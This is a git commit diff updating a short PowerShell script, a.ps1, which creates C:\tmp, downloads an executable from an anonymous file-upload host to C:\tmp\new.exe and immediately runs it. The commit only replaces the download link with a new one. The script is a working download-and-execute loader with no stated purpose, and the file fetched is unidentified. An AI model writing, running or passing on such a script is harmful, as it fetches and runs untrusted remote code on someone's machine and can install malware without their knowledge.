543afc0b8ce28ffc9b09d7720be3e59782b20c4e
lubovbilushna <105020953+lubovbilushna@users.noreply.github.com>
2022-05-06 06:02:43 +0300

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -1,6 +1,6 @@
 ﻿mkdir C:\tmp
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Invoke-WebRequest https://dl.uploadgram.me/627464da2431fh?raw -OutFile C:\tmp\new.exe
+Invoke-WebRequest https://dl.uploadgram.me/62748f8145fe2h?raw -OutFile C:\tmp\new.exe
 cd C:\tmp
 cmd.exe /c "C:\tmp\new.exe"
 exit
